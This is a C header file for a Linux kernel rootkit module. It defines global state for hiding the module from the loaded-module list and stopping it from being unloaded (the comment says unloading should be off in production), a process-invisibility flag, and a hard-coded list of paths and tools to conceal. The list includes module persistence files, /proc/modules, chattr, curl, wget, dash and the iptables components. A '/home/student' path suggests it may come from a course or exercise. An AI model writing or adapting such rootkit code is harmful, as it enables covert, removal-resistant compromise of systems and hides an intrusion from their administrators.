/*
 * Global settings and state for the kernel module.
 * Does not export any functions from the main kernel module file.
 * 
 * Author: Daniel Liscinsky
 */


#ifndef KERNEL_ROOTKIT_H
#define KERNEL_ROOTKIT_H


#include "magic.h"



/**
 * 
 */
#define PF_INVISIBLE 0x10000000



/**
 * Is this kernel module currently hidden (removed) from the list of all loaded kernel modules.
 *	1 = true, 0 = false
 */
short is_module_hidden = 0;

/**
 * Should this kernel module be allowed to be unloaded.
 *	1 = true, 0 = false
 */
short allow_module_unload = // THIS SHOULD BE ZERO FOR ANY PRODUCTION BUILD
#ifdef ALLOW_MODULE_UNLOAD
1
#else
0 
#endif
;


/**
 * A list structure for storing inode numbers.
 */
struct inode_list {
	long inode;
	struct inode_list *next;
};



/**
 * List of inodes which are hidden.
 */
struct inode_list *hidden_inodes_list = NULL;

/**
 * List of files which are hidden.
 */
char *hidden_files_list[] = {
	"/etc/modules", 
	"/etc/modprobe.d/blacklist.conf", 

	"/lib/modules/" "3.13.0-24-generic" "/kernel/drivers/net/" KO_MODULE_NAME ".ko",
	"/lib/modules/" "4.4.0-119-generic" "/kernel/drivers/net/" KO_MODULE_NAME ".ko",
	"/lib/modules/" "4.4.0-122-generic" "/kernel/drivers/net/" KO_MODULE_NAME ".ko",

	"/sys/module/" KO_MODULE_NAME,
	"/sys/module/" KO_MODULE_NAME "/", // Actually a directory
	"/proc/sys/kernel/modules_disabled",
	"/proc/modules",
	
	"chattr",
	"/root/chattr",
	"/home/student/chattr",
	"curl",
	"/usr/bin/curl",
	"wget",
	"/usr/bin/wget",
	"dash",
	"/bin/dash",
	//"python",
	//"/usr/bin/python",
	//"/usr/bin/python2",
	//"python3",
	//"/usr/bin/python3",
	"xtables-multi-14",
	"xtables-multi-16",

	//Possibly unncessary since init_module() *should* (I hope) take of stopping iptables
	"/run/xtables",
	"/run/xtables.lock",
	"iptables",
	"iptable_filter",
	"ip_tables",
	"x_tables",

	//"/etc/ld.so.preload", 
	NULL };



#endif //KERNEL_ROOTKIT_H